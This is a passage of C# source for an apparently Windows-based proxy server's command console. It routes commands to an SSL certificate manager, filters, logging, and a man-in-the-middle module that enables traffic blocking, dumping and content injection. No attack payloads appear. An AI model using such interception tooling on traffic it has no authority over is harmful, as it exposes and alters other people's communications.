                        HelpMod.GetHelp(rest, VHelp.Type.ParameterList, CertMod);
                    }
                    else if (rest == "param")
                    {
                        console.WriteLine("Type help param [parameter name] -to get help about a parameter listed by the help of a command", "ig.ssl");
                    }
                }
                else if (command == "help")
                {
                    HelpMod.ListAll(CertMod);
                }
                else
                {
                    logger.Log("Invalid Cert Manager Command!", VLogger.LogLevel.error);
                }

                if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

                return;
            }

            if (console.GetIntercativeGroup() == "ig.mitm")
            {
                if (command == "create_filters")
                {
                    mitmHttp.CreateFilters();
                }
                else if (command == "list_all")
                {
                    mitmHttp.ListServices();
                }
                else if (command == "check_filters")
                {
                    String[] errors = mitmHttp.CheckBlockers();
                    string output = "";
                    int i = 1;
                    foreach (String e in errors)
                    {
                        output += "[" + i.ToString() + "] " + e + Environment.NewLine;
                        i++;
                    }

                    if (output == "") logger.Log("Filters are correctly working!", VLogger.LogLevel.information);
                    else logger.Log(output, VLogger.LogLevel.error);
                }
                else if (command == "check_dumpers")
                {
                    String[] errors = mitmHttp.CheckDumpers();
                    string output = "";
                    int i = 1;
                    foreach (String e in errors)
                    {
                        output += "[" + i.ToString() + "] " + e + Environment.NewLine;
                        i++;
                    }

                    if (output == "") logger.Log("Dumpers are correctly working!", VLogger.LogLevel.information);
                    else logger.Log(output, VLogger.LogLevel.error);
                }
                else if (command == "create_dumpers")
                {
                    mitmHttp.CreateDumps();
                }
                else if (command == "create_injects")
                {
                    mitmHttp.CreateInjects();
                }
                else if (mitmHttp.IsSetServiceCommand(command))
                {
                    string[] args = command.Split(' ');
                    if (args.Length != 2)
                    {
                        logger.Log("Wrong number of arguments!", VLogger.LogLevel.error);
                        return;
                    }
                    string srv = args[0];
                    string opt = args[1];
                    bool ch = helperMethods.S2b(opt, false, ConMod);
                    if (srv.Contains("block"))
                    {
                        VMitm.BlockServices bs = mitmHttp.StringToBService(srv);
                        mitmHttp.SetServiceState(bs, ch);
                    }
                    else if (srv.Contains("dump"))
                    {
                        VMitm.DumpServices ds = mitmHttp.StringToDService(srv);
                        mitmHttp.SetServiceState(ds, ch);
                    }
                    else if (srv.Contains("inject"))
                    {
                        VMitm.InjectServices iS = mitmHttp.StringToIService(srv);
                        mitmHttp.SetServiceState(iS, ch);
                    }
                }
                else if (command.StartsWith("check_service "))
                {
                    string opt = command.Substring(14);
                    if (opt == "")
                    {
                        logger.Log("No parameters specified!", VLogger.LogLevel.error);
                        return;
                    }
                    bool sstate = false;
                    if (opt.Contains("block"))
                    {
                        VMitm.BlockServices bs = mitmHttp.StringToBService(opt);
                        sstate = mitmHttp.CheckServiceState(bs);
                    }
                    else if (opt.Contains("dump"))
                    {
                        VMitm.DumpServices ds = mitmHttp.StringToDService(opt);
                        sstate = mitmHttp.CheckServiceState(ds);
                    }
                    else if (opt.Contains("inject"))
                    {
                        VMitm.InjectServices iS = mitmHttp.StringToIService(opt);
                        sstate = mitmHttp.CheckServiceState(iS);
                    }

                    logger.Log("MITM" + opt.Substring(4) + " is set to " + ((sstate) ? "Enabled" : "Disabled"), VLogger.LogLevel.information);
                }
                else if (command.StartsWith("list_service "))
                {
                    string opt = command.Substring(13);
                    if (opt == "")
                    {
                        logger.Log("No parameters specified!", VLogger.LogLevel.error);
                        return;
                    }

                    mitmHttp.ListAll(opt);
                }
                else if (command.StartsWith("inject_manager "))
                {
                    string opt = command.Substring(15);
                    bool ch = helperMethods.S2b(opt, false, ConMod);

                    if (ch)
                    {
                        mitmHttp.SetServiceState(VMitm.InjectServices.Core, true);
                        logger.Log("Service MITM_inject_core started", VLogger.LogLevel.service);
                    }
                    else
                    {
                        mitmHttp.SetServiceState(VMitm.InjectServices.Core, false);
                        logger.Log("Service MITM_inject_core stopped", VLogger.LogLevel.service);
                    }
                }
                else if (command.StartsWith("inject_manager"))
                {
                    if (!mitmHttp.CheckServiceState(VMitm.InjectServices.Core))
                    {
                        logger.Log("MITM_inject_core is not started!", VLogger.LogLevel.warning);
                        return;
                    }
                    console.Clear();
                    mitmHttp.pRestore = console.GetPrompt();
                    console.SetPrompt("/proxyServer/MITM/inject_manager>");
                    console.SetInteractiveGroup("ig.inject");
                    mitmHttp.selfInteractive = true;
                }
                else if (command == "cls")
                {
                    console.Clear();
                }
                else if (command == "exit")
                {
                    string p = mitmHttp.pRestore;
                    console.SetPrompt(p);
                    console.SetInteractiveGroup("ig.null");
                    mitmHttp.pRestore = "";
                    mitmHttp.selfInteractive = false;
                    console.Clear();
                }
                else if (command.StartsWith("help "))
                {
                    string rest = command.Substring(5);
                    if (!rest.StartsWith("int") && !rest.StartsWith("param ") && rest != "param")
                    {
                        HelpMod.GetHelp(rest, VHelp.Type.Command, mitmHttp);
                    }
                    else if (rest.StartsWith("param "))
                    {
                        rest = rest.Substring(6);
                        HelpMod.GetHelp(rest, VHelp.Type.ParameterList, mitmHttp);
                    }
                    else if (rest == "param")
                    {
                        console.WriteLine("Type help param [parameter name] -to get help about a parameter listed by the help of a command", "ig.mitm");
                    }
                }
                else if (command == "help")
                {
                    HelpMod.ListAll(mitmHttp);
                }
                else
                {
                    logger.Log("Invalid MITM_Core Command!", VLogger.LogLevel.error);
                }

                if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

                return;
            }

            if (console.GetIntercativeGroup() == "ig.vfman")
            {
                if (command.StartsWith("add "))
                {
                    string name = command.Substring(4);
                    if (name.Contains(" "))
                    {
                        logger.Log("Filter names can't contain spaces!\r\n Use dash \"-\" instead.", VLogger.LogLevel.error);
                        return;
                    }
                    bool result = vf.CreateFilter(name);
                    if (result)
                    {
                        logger.Log("Filter added to filter list!", VLogger.LogLevel.information);
                    }
                    else
                    {
                        logger.Log("A filter with that name already exists!", VLogger.LogLevel.error);
                    }
                }
                else if (command.StartsWith("del "))
                {
                    string name = command.Substring(4);
                    bool result = vf.DestroyFilter(name);
                    if (result)
                    {
                        logger.Log("Filter removed from filter list!", VLogger.LogLevel.information);
                    }
                    else
                    {
                        logger.Log("Filter don't exists!", VLogger.LogLevel.error);
                    }
                }
                else if (command == "clear")
                {
                    vf.ResetAllFilter();
                    logger.Log("Reset completed!", VLogger.LogLevel.information);
                }
                else if (command.StartsWith("setup "))
                {
                    command = command.Substring(6);
                    String[] opt = command.Split(' ');
                    string fName = opt[0];
                    string fOp = opt[1];
                    string firstPart = fName + " " + fOp + " ";
                    string value = command.Replace(firstPart, String.Empty);
                    VFilter.Operation operation = helperMethods.S2op(fOp);
                    if (operation == VFilter.Operation.Undefined)
                    {
                        logger.Log("The operation you specified is not valid!", VLogger.LogLevel.error);
                        return;
                    }

                    bool result = vf.Addfilter(fName, operation, value);

                    if (result)
                    {
                        logger.Log("Filter added to " + fName, VLogger.LogLevel.information);
                    }
                    else
                    {
                        logger.Log("Failed to add filter to " + fName, VLogger.LogLevel.error);
                    }
                }
                else if (command.StartsWith("remove "))
                {
                    command = command.Substring(7);
                    String[] opt = command.Split(' ');
                    string fName = opt[0];
                    string fOp = opt[1];
                    string firstPart = fName + " " + fOp + " ";
                    string value = command.Replace(firstPart, String.Empty);
                    VFilter.Operation operation = helperMethods.S2op(fOp);
                    if (operation == VFilter.Operation.Undefined)
                    {
                        logger.Log("The operation you specified is not valid!", VLogger.LogLevel.error);
                        return;
                    }

                    bool result = vf.RemoveFilter(fName, operation, value);

                    if (result)
                    {
                        logger.Log("Filter removed frome " + fName, VLogger.LogLevel.information);
                    }
                    else
                    {
                        logger.Log("Failed to remove filter from " + fName, VLogger.LogLevel.error);
                    }
                }
                else if (command == "list")
                {
                    vf.PrintFilter();
                }
                else if (command.StartsWith("show "))
                {
                    string opt = command.Substring(5);
                    vf.PrintRules(opt);
                }
                else if (command == "cls")
                {
                    console.Clear();
                }
                else if (command == "exit")
                {
                    string prompt = vf.pRestore;
                    vf.pRestore = "";
                    console.SetPrompt(prompt);
                    console.SetInteractiveGroup("ig.null");
                    vf.selfInteractive = false;
                }
                else if (command.StartsWith("help "))
                {
                    string rest = command.Substring(5);
                    if (!rest.StartsWith("int") && !rest.StartsWith("param ") && rest != "param")
                    {
                        HelpMod.GetHelp(rest, VHelp.Type.Command, vf);
                    }
                    else if (rest.StartsWith("param "))
                    {
                        rest = rest.Substring(6);
                        HelpMod.GetHelp(rest, VHelp.Type.ParameterList, vf);
                    }
                    else if (rest == "param")
                    {
                        console.WriteLine("Type help param [parameter name] -to get help about a parameter listed by the help of a command", "ig.vfman");
                    }
                }
                else if (command == "help")
                {
                    HelpMod.ListAll(vf);
                }
                else
                {
                    logger.Log("Invalid Filter manager Command!", VLogger.LogLevel.error);
                }

                if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

                return;
            }

            if (console.GetIntercativeGroup() == "ig.logger")
            {
                if (command.StartsWith("set file_logger "))
                {
                    string opt = command.Substring(16);
                    bool ch = helperMethods.S2b(opt, false, ConMod);
                    if (ch)
                    {
                        logger.printToFile = true;
                        logger.Log("Logger.FileLogging.State started", VLogger.LogLevel.service);
                    }
                    else
                    {
                        logger.printToFile = false;
                        logger.Log("Logger.FileLogging.State disabled", VLogger.LogLevel.service);
                    }
                }
                else if (command.StartsWith("bind "))
                {
                    command = command.Substring(5);
                    String[] parts = command.Split(' ');
                    if (parts.Length != 2)
                    {
                        logger.Log("Wrong number of arguments!\r\nbind [filter_name] [target_bind]", VLogger.LogLevel.error);
                        return;
                    }

                    VLogger.LogLevel option = VLogger.StringToLogLevel(parts[1]);
                    string filterName = parts[0];

                    if (option == VLogger.LogLevel.unknown)
                    {
                        logger.Log("Wrong target_bind parameter valid parameters are: request, response, information, error, service, warning", VLogger.LogLevel.error);
                        return;
                    }

                    logger.BindFilter(filterName, option);
                    logger.Log("Filter bind completed!", VLogger.LogLevel.information);
                }
                else if (command.StartsWith("unbind "))
                {
                    string filterName = command.Substring(7);

                    logger.UnBindFilter(filterName);
                    logger.Log("Filter unbind completed!", VLogger.LogLevel.information);
                }
                else if (command == "bind_list")
                {
                    logger.BindList();
                }
                else if (command.StartsWith("set file_path "))
                {
                    string path = command.Substring(14);
                    logger.SetFile(path);
                    logger.Log("Logger.FileLogging.Path set to " + path, VLogger.LogLevel.information);
                }
                else if (command.StartsWith("set output_data "))
                {
                    string opts = command.Substring(16);
                    string[] optList = opts.Split(' ');
                    bool err = false;
                    bool war = false;
                    bool req = false;
                    bool resp = false;
                    bool srv = false;

                    foreach (string logOption in optList)
                    {
                        if (logOption == "error") err = true;
                        if (logOption == "warning") war = true;
                        if (logOption == "request") req = true;
                        if (logOption == "response") resp = true;
                        if (logOption == "service") srv = true;
                        if (logOption == "*" || logOption == "all")
                        {
                            err = true;
                            war = true;
                            srv = true;
                            req = true;
                            resp = true;
                        }
                    }

                    logger.SetupLogLevel(err, war, srv, req, resp);
                    logger.Log("Logger.Global.LogLevelOutput changed!", VLogger.LogLevel.information);
                }
                else if (command == "exit")
                {
                    string prompt = logger.pRestore;
                    logger.pRestore = "";
                    console.SetPrompt(prompt);
                    console.SetInteractiveGroup("ig.null");
                    logger.selfInteractive = false;
                    console.Clear();
                }
                else if (command == "cls")
                {
                    console.Clear();
                }
                else if (command.StartsWith("help "))
                {
                    string rest = command.Substring(5);
                    if (!rest.StartsWith("int") && !rest.StartsWith("param ") && rest != "param")
                    {
                        HelpMod.GetHelp(rest, VHelp.Type.Command, LogMod);
                    }
                    else if (rest.StartsWith("param "))
                    {
                        rest = rest.Substring(6);
                        HelpMod.GetHelp(rest, VHelp.Type.ParameterList, LogMod);
                    }
                    else if (rest == "param")
                    {
                        console.WriteLine("Type help param [parameter name] -to get help about a parameter listed by the help of a command", "ig.logger");
                    }
                }
                else if (command == "help")
                {
                    HelpMod.ListAll(LogMod);
                }
                else
                {
                    logger.Log("Invalid Logger Command!", VLogger.LogLevel.error);
                }

                if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

                return;
            }

            if (pinManager.isSet && pinManager.isEnable)
            {
                if (!pinManager.CheckPin(command)) return;
            }

            if (command.StartsWith("set ip "))
            {
                ip = command.Substring(7);
                if (helperMethods.IpVerification(ip))
                    logger.Log("IP Address set to: " + ip, VLogger.LogLevel.information);
                else
                {
                    ip = "";
                    logger.Log("Invalid IP Address Specified", VLogger.LogLevel.error);
                }
            }
            else if (command.StartsWith("set port "))
            {
                string input = command.Substring(9);
                if (helperMethods.IsInteger(input, ConMod))
                {
                    port = int.Parse(input);
                    if (helperMethods.PortVerification(port))
                        logger.Log("Port set to: " + port.ToString(), VLogger.LogLevel.information);
                    else
                    {
                        port = 0;
                        logger.Log("Invalid Port Number", VLogger.LogLevel.error);
                    }
                }
            }
            else if (command.StartsWith("set pending_limit "))
            {
                string input = command.Substring(18);

                if (helperMethods.IsInteger(input, ConMod))
                {
                    pendingConnectionLimit = int.Parse(input);
                    if (pendingConnectionLimit > 0) logger.Log("Pending Connection Limit set to: " + pendingConnectionLimit.ToString(), VLogger.LogLevel.information);
                    else logger.Log("Number has to be at least 1!", VLogger.LogLevel.error);
                }
            }
            else if (command == "cls")
            {
                console.Clear();
            }
            else if (command == "exit")
            {
                Thread t = new Thread(new ThreadStart(Exit));
                t.Start();
            }
            else if (command == "start")
            {
                if (server == null)
                {
                    server = new ProxyServer(ip, port, pendingConnectionLimit, console, this);
                }
                else if (!isStarted && server != null)
                {
                    server.Setup(ip, port, pendingConnectionLimit);
                }

                if (server == null)
                {
                    server.SetMode(ProxyServer.Mode.forward, "http");
                    server.SetMode(ProxyServer.Mode.forward, "https");
                }

                server.StartServer();
                logger.Log("Server Started", VLogger.LogLevel.information);
                isStarted = true;
            }
            else if (command.StartsWith("set font_size "))
            {
                string input = command.Substring(14);

                if (helperMethods.IsFloat(input, ConMod))
                {
                    float size = float.Parse(input);
                    console.SetTextSize(size);
                    logger.Log("Textsize set to: " + size.ToString(), VLogger.LogLevel.information);
                }
            }
            else if (command.StartsWith("auto_allow "))
            {
                if (!isStarted)
                {
                    helperMethods.ServerNotStarted(ConMod);
                    return;
                }
                string opt = command.Substring(11);
                bool ch = helperMethods.S2b(opt, true, ConMod);
                server.autoAllow = ch;
                if (ch) logger.Log("AutoAllow Active", VLogger.LogLevel.service);
                else logger.Log("AutoAllow diabled", VLogger.LogLevel.service);
            }
            else if (command.StartsWith("set pin "))
            {
                if (!pinManager.isEnable)
                {
                    helperMethods.ServiceNotStarted(ConMod);
                    return;
                }
                string pin = command.Substring(8);

                if (helperMethods.IsInteger(pin, ConMod))
                {
                    pinManager.SetPin(pin);
                }
            }
            else if (command.StartsWith("pin_manager "))
            {
                string opt = command.Substring(12);
                bool ch = helperMethods.S2b(opt, true, ConMod);
                pinManager.isEnable = ch;
                if (ch) logger.Log("PinManager Active", VLogger.LogLevel.service);
                else logger.Log("PinManager diabled", VLogger.LogLevel.service);
            }
            else if (command.StartsWith("stop"))
            {
                server.StopServer();
                server.Dispose();
                server = null;
                isStarted = false;
            }
            else if (command.StartsWith("save "))
            {
                string filename = command.Substring(5);
                if (server == null)
                {
                    server = new ProxyServer(ip, port, pendingConnectionLimit, console, this);
                }
                SetMod.SetupObjects(this, console, pinManager, server, vf, RegMod, logger, DumpMod, CertMod, mitmHttp, InjectMod);
                SetMod.Save(filename);
            }
            else if (command.StartsWith("load "))
            {
                string filename = command.Substring(5);
                SetMod.FindFile(filename);
                server = helperMethods.CreateServer(server, ip, port, pendingConnectionLimit, ConMod, this);
                SetMod.SetupObjects(this, console, pinManager, server, vf, RegMod, logger, DumpMod, CertMod, mitmHttp, InjectMod);
                SetMod.Load();
            }
            else if (command == "clean_client")
            {
                if (server != null)
                {
                    string prompt = console.GetPrompt();
                    console.SetPrompt("[Y/N]");
                    bool result = console.ChoicePrompt("[Y/N] Do you really want to disconnect all clients?");
                    if (result)
                    {
                        server.CleanSockets();
                    }

                    console.SetPrompt(prompt);
                }
            }
            else if (command.StartsWith("logger "))
            {
                string opt = command.Substring(7);
                bool ch = helperMethods.S2b(opt, false, ConMod);
                if (ch)
                {
                    logger.Log("Logger Enabled", VLogger.LogLevel.service);
                    logger.started = true;
                }
                else
                {
                    logger.Log("Logger Disabled", VLogger.LogLevel.service);
                    logger.started = false;
                }
            }
            else if (command == "logger")
            {
                if (!logger.started)
                {
                    logger.Log("Logger service is not started\r\nCannot enter interactive mode!", VLogger.LogLevel.warning);
                    return;
                }
                console.SetInteractiveGroup("ig.logger");
                console.Clear();
                logger.pRestore = console.GetPrompt();
                console.SetPrompt("/proxyServer/logger>");
                logger.selfInteractive = true;
            }
            else if (command.StartsWith("filter_manager "))
            {
                string opt = command.Substring(15);
                bool ch = helperMethods.S2b(opt, true, ConMod);

                if (ch)
                {
                    vf.started = true;
                    logger.Log("Filter Manager started!", VLogger.LogLevel.service);
                }
                else
                {
                    vf.started = false;
                    logger.Log("Filter Manager stopped!", VLogger.LogLevel.service);
                }
            }
            else if (command == "filter_manager")
            {
                if (!vf.started)
                {
                    logger.Log("Service filter manager is not started!", VLogger.LogLevel.warning);
                    return;
                }

                console.SetInteractiveGroup("ig.vfman");
                console.Clear();
                vf.pRestore = console.GetPrompt();
                console.SetPrompt("/proxyServer/filter_manager>");
                vf.selfInteractive = true;
            }
            else if (command.StartsWith("mitm "))
            {
                string opt = command.Substring(5);
                bool ch = helperMethods.S2b(opt, false, ConMod);
                if (ch)
                {
                    logger.Log("MITM_core is Started", VLogger.LogLevel.service);
                    mitmHttp.started = true;
                }
                else
                {
                    logger.Log("MITM_core is disabled", VLogger.LogLevel.service);
                    mitmHttp.started = false;
                }
            }
            else if (command == "mitm")
            {
                if (!mitmHttp.started)
                {
                    logger.Log("MITM_core is not started!", VLogger.LogLevel.warning);
                    return;
                }
                mitmHttp.pRestore = console.GetPrompt();
                console.SetInteractiveGroup("ig.mitm");
                mitmHttp.selfInteractive = true;
                console.Clear();
                console.SetPrompt("/proxyServer/MITM>");
            }
            else if (command.StartsWith("sslcert_manager "))
            {
                string opt = command.Substring(16);
                bool ch = helperMethods.S2b(opt, false, ConMod);
                if (ch)
                {
                    logger.Log("SSL Certification Manager started", VLogger.LogLevel.service);
                    CertMod.Started = true;
                }
                else
                {
                    logger.Log("SSL Certification Manager disabled", VLogger.LogLevel.service);
                    CertMod.Started = false;
                }
            }
            else if (command == "sslcert_manager")
            {
                if (!CertMod.Started)
                {
                    CertMod.WarningMessage();
                    return;
                }
                CertMod.PRestore = console.GetPrompt();
                console.SetPrompt("/proxyServer/certManager>");
                console.SetInteractiveGroup("ig.ssl");
                CertMod.SelfInteractive = true;
                console.Clear();
            }
            else if (command.StartsWith("set mode "))
            {
                string opt = command.Substring(9);
                if (!opt.Contains(" "))
                {
                    logger.Log("No parameters specified", VLogger.LogLevel.error);
                    return;
                } // opt check
                String[] opts = opt.Split(' ');
                if (opts.Length != 2)
                {
                    logger.Log("Invalid number of parameters", VLogger.LogLevel.error);
                    return;
                } // opt count check
                ProxyServer.Mode pMode = ProxyServer.StringToMode(opts[1]);
                string prot = opts[0].ToLower();
                if (isStarted && pMode != ProxyServer.Mode.Undefined)
                {
                    if (prot == "http" || prot == "https") server.SetMode(pMode, prot);
                    logger.Log(prot.ToUpper() + " mode set to " + opts[1].ToUpper(), VLogger.LogLevel.information);
                }
                else if (isStarted && pMode == ProxyServer.Mode.Undefined) logger.Log("One or all of the parameters are invalid!", VLogger.LogLevel.error);
                else logger.Log("Server Not Started!", VLogger.LogLevel.error);
            }
            else if (command == "list_modes")
            {
                if (server != null) server.PrintModes();
                else logger.Log("Server not available!", VLogger.LogLevel.error);
            }
            else if (command.StartsWith("dump_manager "))
            {
                string opt = command.Substring(13);
                bool ch = helperMethods.S2b(opt, false, ConMod);
                if (ch)
                {
                    logger.Log("Dump manager started!", VLogger.LogLevel.service);
                    DumpMod.Started = true;
                }
                else
                {
                    logger.Log("Dump manager disabled!", VLogger.LogLevel.service);
                    DumpMod.Started = false;
                }
            }
            else if (command == "dump_manager")
            {
                if (!DumpMod.Started)
                {
                    DumpMod.WarningMessage();
                    return;
                }

                DumpMod.PRestore = console.GetPrompt();
                console.SetPrompt("/proxyServer/dumpManager>");
                DumpMod.SelfInteractive = true;
                console.Clear();
                console.SetInteractiveGroup("ig.dump");
            }
            else if (command.StartsWith("regex_manager "))
            {
                string opt = command.Substring(14);
                bool ch = helperMethods.S2b(opt, false, ConMod);
                if (ch)
                {
                    logger.Log("Regular Expression Manager Started", VLogger.LogLevel.service);
                    RegMod.Started = true;
                }
                else
                {
                    logger.Log("Regular Expression Manager Stopped", VLogger.LogLevel.service);
                    RegMod.Started = false;
                }
            }
            else if (command == "regex_manager")
            {
                if (!RegMod.Started)
                {
                    RegMod.WarningMessage();
                    return;
                }

                RegMod.SelfInteractive = true;
                RegMod.PRestore = console.GetPrompt();
                console.SetPrompt("/proxyServer/regex_manager>");
                console.SetInteractiveGroup("ig.regex");
                console.Clear();
            }
            else if (command.StartsWith("help "))
            {
                string rest = command.Substring(5);
                if (rest.StartsWith("int "))
                {
                    string path = rest.Substring(4);
                    HelpMod.RunInteractiveHelp(path);
                    if (!HelpMod.GetCommandUpdates)
                    {
                        logger.Log("No such interactive help modul\r\nType help int -to list available interactive help modules", VLogger.LogLevel.error);
                        return;
                    }
                }
                else if (rest == "int")
                {
                    HelpMod.ListInteractive();
                }
                else if (rest.StartsWith("param "))
                {
                    string p = rest.Substring(6);
                    HelpMod.GetHelp(p, VHelp.Type.ParameterList);
                }
                else if (rest == "param")
                {
                    console.WriteLine("Type help param [parameter] -to get help on a parameter listed by a help of a command");
                }
                else
                {
                    HelpMod.GetHelp(command, VHelp.Type.Command);
                }
            }
            else if (command == "help")
            {
                HelpMod.ListAll(this);
            }
            else
            {
                logger.Log("Invalid Command!", VLogger.LogLevel.error);
            }

            if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

            //feature: auto clean implemented, but disabled
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            helperMethods.FinalExit(_ipcServer, server, LogMod, VdwMod, SetMod, InjectMod, 
                RegMod, mitmHttp, DumpMod, CertMod, ConMod, PinMod, vf, isStarted);
        }
    }

    struct CommandObj
    {
        public string command;
        public VConsole console;
        public VPin pinManager;
    }
}